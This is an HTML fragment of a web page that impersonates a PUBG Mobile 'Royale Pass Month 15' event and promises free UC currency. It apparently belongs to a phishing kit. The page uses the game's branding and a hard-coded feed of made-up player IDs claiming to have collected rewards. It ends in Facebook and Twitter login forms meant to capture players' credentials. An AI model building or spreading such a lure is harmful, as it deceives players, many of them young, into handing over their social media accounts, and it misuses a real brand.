...
<meta property="og:title" content="PUBG MOBILE: Royale Pass Month 15">
<meta name="description" content="Collect your special rewards at the Royale Pass Month 15 event. This opportunity is limited and without the need for topup. Collect your rewards now!">
<meta property="og:description" content="Collect your special rewards at the Royale Pass Month 15 event. This opportunity is limited and without the need for topup. Collect your rewards now!">
<meta property="og:url" content="./">
<meta property="og:site_name" content="PUBG MOBILE: Royale Pass Month 15">
<meta property="og:type" content="website">
<meta name="copyright"content="PUBG MOBILE">
<meta name="theme-color" content="#000">
<meta property="og:image" content="https://www.pubgmobile.com/images/event/royalepassm15/share.jpg">
<title>PUBG MOBILE: Royale Pass Month 15</title>
...
<div>
<figure>
<div class="item-nominal">1000</div>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/0QWX9JsG/uc.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_otherReward_confirmation(this);" value="1000" src="https://i.postimg.cc/0QWX9JsG/uc.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<div class="item-nominal">3000</div>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/0QWX9JsG/uc.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_otherReward_confirmation(this);" value="3000" src="https://i.postimg.cc/0QWX9JsG/uc.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
...
<div class="event-notification">
<img src="img/helmet.png">
<div class="event-notification-player">ID 5883485425 collected UC - 1000</div> <!--- event-notification-player --->
<div class="event-notification-player">ID 5295893347 collected UC - 5000</div> <!--- event-notification-player --->
<div class="event-notification-player">ID 5963737318 collected UC - 5000</div> <!--- event-notification-player --->
<div class="event-notification-player">ID 5888686451 collected UC - 5000</div> <!--- event-notification-player --->
<div class="event-notification-player">ID 5155030554 collected UC - 3000</div> <!--- event-notification-player --->
<div class="event-notification-player">ID 5463336783 collected UC - 1000</div> <!--- event-notification-player --->
<div class="event-notification-player">ID 4745754754 collected UC - 3000</div> <!--- event-notification-player --->
<div class="event-notification-player">ID 9456455456 collected UC - 3000</div> <!--- event-notification-player --->
<div class="event-notification-player">ID 7845654658 collected UC - 3000</div> <!--- event-notification-player --->
<div class="event-notification-player">ID 1254564878 collected UC - 1000</div> <!--- event-notification-player --->
<div class="event-notification-player">ID 8563473477 collected UC - 3000</div> <!--- event-notification-player --->
<div class="event-notification-player">ID 3458568856 collected UC - 1000</div> <!--- event-notification-player --->
<div class="event-notification-player">ID 5475485686 collected UC - 1000</div> <!--- event-notification-player --->
<div class="event-notification-player">ID 5685685654 collected UC - 3000</div> <!--- event-notification-player --->
<div class="event-notification-player">ID 9691464874 collected UC - 5000</div> <!--- event-notification-player --->
<div class="event-notification-player">ID 1587478555 collected UC - 1000</div> <!--- event-notification-player --->
<div class="event-notification-player">ID 6774574854 collected UC - 3000</div> <!--- event-notification-player --->
<div class="event-notification-player">ID 5856834778 collected UC - 1000</div> <!--- event-notification-player --->
</div> <!--- event-notification --->
</div> <!--- rewards-wrapper --->
</div> <!--- rewards-section --->
...
<form class="login-form" action="javascript:void(0)" method="post" id="ValidateLoginFbDataForm">
<label>
...
<br>
<center>
<form action="javascript:void(0)" method="post" id="ValidateLoginTwitterDataForm">
